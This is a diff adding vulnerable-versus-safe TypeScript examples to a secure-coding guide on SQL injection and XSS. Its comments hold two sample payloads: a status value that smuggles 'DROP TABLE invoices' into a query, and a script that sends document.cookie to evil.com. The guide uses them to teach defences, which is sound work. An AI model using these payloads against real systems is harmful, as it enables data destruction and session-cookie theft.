@@ -5,6 +5,8 @@ description: "Security as a design property, not an added layer. OWASP Top 10, s
 
 # Security by Design
 
+> **Version**: 1.0.0 | **Last updated**: 2026-02-08
+
 ## Purpose
 
 Security is a design property, not an added layer. Covers OWASP, supply chain security, dependency management, secrets management, and zero trust approach.
@@ -24,6 +26,43 @@ Security is a design property, not an added layer. Covers OWASP, supply chain se
 **Security Misconfiguration**: mandatory HTTP security headers (Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security). Disable headers revealing technology (X-Powered-By). Restrictive CORS (never `*` in production).
 
 **Cross-Site Scripting (XSS)**: output sanitization (React and Vue do this by default with escaping, but beware `dangerouslySetInnerHTML` / `v-html`). Content-Security-Policy to block inline scripts.
+
+### Concrete Vulnerability Examples
+
+**SQL Injection — vulnerable vs safe**:
+
+```typescript
+// VULNERABLE — string concatenation
+const query = `SELECT * FROM invoices WHERE tenant_id = '${tenantId}' AND status = '${status}'`;
+// Attacker sends: status = "'; DROP TABLE invoices; --"
+
+// SAFE — parameterized query (Drizzle ORM)
+const invoices = await db
+  .select()
+  .from(invoicesTable)
+  .where(and(eq(invoicesTable.tenantId, tenantId), eq(invoicesTable.status, status)));
+```
+
+**XSS — vulnerable vs safe**:
+
+```typescript
+// VULNERABLE — rendering user input as HTML
+function Comment({ text }: { text: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: text }} />;
+  // Attacker sends: text = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
+}
+
+// SAFE — React auto-escapes by default
+function Comment({ text }: { text: string }) {
+  return <div>{text}</div>; // Script tags rendered as text, not executed
+}
+
+// SAFE — if HTML rendering is needed, sanitize first
+import DOMPurify from 'dompurify';
+function Comment({ text }: { text: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />;
+}
+```
 
 ---
 
